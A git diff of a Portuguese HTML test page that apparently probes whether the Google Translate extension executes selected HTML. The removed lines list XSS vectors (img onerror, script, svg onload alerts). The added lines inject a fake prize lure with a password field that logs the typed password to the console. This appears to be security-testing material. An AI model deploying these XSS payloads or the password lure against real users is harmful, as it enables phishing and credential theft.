@@ -1,39 +1,33 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
-<meta charset="UTF-8" />
-<title>Teste XSS na extensão Google Tradutor</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    margin: 20px;
-  }
-  pre {
-    background: #f9f9f9;
-    border: 1px solid #ddd;
-    padding: 15px;
-    white-space: pre-wrap;
-    user-select: text;
-  }
-</style>
+  <meta charset="UTF-8">
+  <title>Simulação de Coleta de Senha</title>
 </head>
 <body>
+  <h1>Exemplo de Página</h1>
+  <p>Selecione o texto abaixo e clique com o botão direito para traduzir:</p>
 
-<h1>Teste de Vulnerabilidade XSS no Google Tradutor</h1>
+  <script>
+    // Injeção do conteúdo HTML malicioso
+    let p = document.createElement("p");
+    p.innerHTML = `
+      <div style="background:black;color:lime;font-size:18px;padding:10px;margin-top:10px;">
+        🔒 VOCÊ GANHOU MIL REAIS, ENTRE COM SUA SENHA PARA RESGATAR:
+      </div>
+      <input id="fake-pass" type="password" placeholder="SENHA AQUI" style="padding:5px;margin-top:5px;">
+    `;
+    document.body.appendChild(p);
 
-<p>Selecione todo o conteúdo abaixo, incluindo as tags HTML, e use a extensão Google Tradutor para traduzir o texto selecionado.</p>
-
-<pre>
-&lt;img src="x" onerror="alert('XSS via IMG onerror!')" /&gt;
-&lt;script&gt;alert('XSS via script!' )&lt;/script&gt;
-&lt;svg onload="alert('XSS via SVG onload!')"&gt;&lt;/svg&gt;
-
-&lt;div style="background:black;color:lime;padding:10px;"&gt;
-  🔒 Your session has expired. Please log in again:
-&lt;/div&gt;
-&lt;input type="password" placeholder="Enter your password" style="padding:5px;margin-top:5px;" /&gt;
-</pre>
-
+    // Simula coleta de senha ao pressionar Enter
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("fake-pass").addEventListener("keydown", function(e) {
+        if (e.key === "Enter") {
+          console.log("Senha digitada:", this.value);
+        }
+      });
+    });
+  </script>
 </body>
 </html>
 
